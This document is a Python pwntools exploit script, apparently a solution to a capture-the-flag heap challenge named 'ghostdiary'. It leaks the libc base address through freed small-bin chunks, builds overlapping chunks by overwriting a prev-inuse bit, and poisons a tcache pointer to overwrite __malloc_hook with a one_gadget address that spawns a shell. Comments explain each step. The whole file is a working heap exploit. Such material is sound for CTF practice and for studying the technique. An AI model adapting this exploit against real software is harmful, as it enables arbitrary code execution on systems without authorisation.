from pwn import *
from struct import pack
import sys


# ** Constants
PAGE_BYTE_BASE = 0x30

MSG_NEW_PAGE_IN_DIARY = b'1'
MSG_TALK_TO_GHOST = b'2'
MSG_LISTEN_TO_GHOST = b'3'
MSG_BURN_PAGE = b'4'
MSG_GO_TO_SLEEP = b'5'

MSG_SMALL_ALLOCATION = b'1'
MSG_BIG_ALLOCATION = b'2'

# ** Constants foud by manual enumeration
SMALL_BIN_OFFSET = 0x3ebf10
MALLOC_HOOK_OFFSET = 0x3ebc30
ONE_SHOT_OFFSET = 0x10a38c


def page(idx):
    return str(idx).encode('utf-8')


def psize(page_size):
    return str(page_size - 0x8).encode('utf-8')


def allocate_page(page_size):
    read_menu()
    p.sendline(MSG_NEW_PAGE_IN_DIARY)
    p.recvuntil(b'1. Write on one side?\n')
    p.recvuntil(b'2. Write on both sides?\n')
    p.recvuntil(b'> ')
    if int(page_size) < 0xf1:
        p.sendline(MSG_SMALL_ALLOCATION)
    else:
        p.sendline(MSG_BIG_ALLOCATION)
    p.recvuntil(b'size: ')
    p.sendline(page_size)


def write_on_page(page_idx, content):
    read_menu()
    p.sendline(MSG_TALK_TO_GHOST)
    p.recvuntil(b'Page: ')
    p.sendline(page_idx)
    p.recvuntil(b'Content: ')
    p.sendline(content)


def read_page(page_idx):
    read_menu()
    p.sendline(MSG_LISTEN_TO_GHOST)
    p.recvuntil(b'Page: ')
    p.sendline(page_idx)
    page_content = p.readline()[len(b'Content: '):-1]
    return page_content


def free_page(page_idx):
    read_menu()
    p.sendline(MSG_BURN_PAGE)
    p.recvuntil(b'Page: ')
    p.sendline(page_idx)


def exit_program():
    read_menu()
    p.sendline(MSG_GO_TO_SLEEP)


def read_menu():
    p.recvuntil(b'1. New page in diary\n2. Talk with ghost\n3. Listen to ghost\n4. Burn the page\n5. Go to sleep\n> ')


def get_libc_base():
    # 7 chunk for tcache + 2 chunks for small bin list + 1 chunk to prevent from consolidation with top chunk
    for i in range(0, 10):
        allocate_page(psize(0x134))

    # Fill tchace with pages [0-6] + small bin with pages [7-8]. Page with idx.7 will contain libc small bin address in fd
    for i in range(0, 9):
        free_page(page(i))

    # As tcache is a LIFO, the chunk containing address of page 0 as fd field has now index 5.
    # Chunk containing libc address is now indexed as page 7
    for i in range(0, 9):
        allocate_page(psize(0x134))

    small_bin_addr = read_page(b'7')[:8]
    pad_len = 8 - len(small_bin_addr)
    small_bin_addr = u64(small_bin_addr + pad_len * b'\x00')
    libc_base = small_bin_addr - SMALL_BIN_OFFSET
    log.info("Libc base: " + hex(libc_base))

    for i in range(0, 7):
        free_page(page(i))
    for i in range(9, 6, -1):
        free_page(page(i))

    return libc_base


def overwrite_malloc_hook(libc_base):
    malloc_hook_addr = libc_base + MALLOC_HOOK_OFFSET

    # some magic to fill tcache 0x100
    for i in range(0, 7):
        allocate_page(psize(0x20))
        allocate_page(psize(0x18e))
    allocate_page(psize(0x10)) # to prevent top chunk consolidation
    for i in range(0, 14, +2):
        write_on_page(page(i), b'\x00' * 0x18)
    for i in range(0, 14):
        free_page(page(i))
    free_page(page(14))

    # 7 chunks from tcache 0x140
    for i in range(0, 7):
        allocate_page(psize(0x140))

    # chunks [7-9] will be used to get overlapping chunks
    allocate_page(psize(0x140)) # idx. 7
    allocate_page(psize(0x70)) # idx. 8
    allocate_page(psize(0x140)) # idx. 9
    allocate_page(psize(0x18)) # to prevent from top chunk consolidation, idx. 10

    # fill tcache 0x140
    for i in range(0, 7):
        free_page(page(i))

    # Free chunk 7. Later on when we will free chunk 9 we will want to consolidate it together with chunk 7.
    free_page(page(7))

    # Overwrite prev inuse bit located in chunk 9 header. This will also decrease size of chunk 9 from 0x140 to 0x100. Set the previous block size to 0x1b0 (0x140 + 0x70), so that block 9 thinks that blocks 7+8 is just one huge free block.
    write_on_page(page(8), b'8' * 0x60 + pack('<Q', 0x1b0))

    # Create two fake chunks inside chunk 9. This is possible as we just decreased the size of it from 0x140 to 0x100 so we have 0x40 bytes left for manipulation. We need this as glibc 2.27 free has many checks.
    write_on_page(page(9), b'\x00' * 0xf8 + pack('<Q', 0x17) + b'\x00' * 8 + pack('<Q', 0x17))

    # Here we trick malloc. We free only chunk 9, but the glibc will check if previous block is free. It is as we have freed it before (free_page(page(7)). So glibc will consolidate it with the previous block. Now glibc thinks that all blocks 7, 8 and 9 were freed. In reality we have still a pointer to block 8.
    free_page(page(9))

    # Allocate big block which will overlap with block 8.
    allocate_page(psize(0x1b0)) # idx. 0

    # Free page 8, it will place it into a tcache of size 0x70 which is stored as a single liked list.
    free_page(page(8))

    # Set the fd pointer of chunk 8 (hey, we can still do it as we have access to chunk 0 which is overlapping chunk 8. The new fd pointer will point to malloc_hook_address.
    write_on_page(page(0), b'B' * (0x140 - 0x10) + pack('<Q', 0x140) + pack('<Q', 0x70) + p64(malloc_hook_addr))

    # Now we need to perform two reads. The first will return previously freed chunk 8, but the second one will return as pointer to malloc_hook_address!
    allocate_page(psize(0x70))
    allocate_page(psize(0x70)) # malloc hook, idx. 2

    # New stuff! Somethimes we don't have to create a full ROP to call execve! We can do one_shot jmp. I've used one_gadget for it.
    write_on_page(page(2), p64(libc_base + ONE_SHOT_OFFSET))



p = process('ghostdiary')

p.recvuntil(b'-=-=-=[[Ghost Diary]]=-=-=-\n')


libc_base = get_libc_base()
# Note that now first 7 chunks are in tcache 0->1->2->..->6, top chunk
overwrite_malloc_hook(libc_base)
# invoke execve
allocate_page(psize(0x18)) 


p.interactive()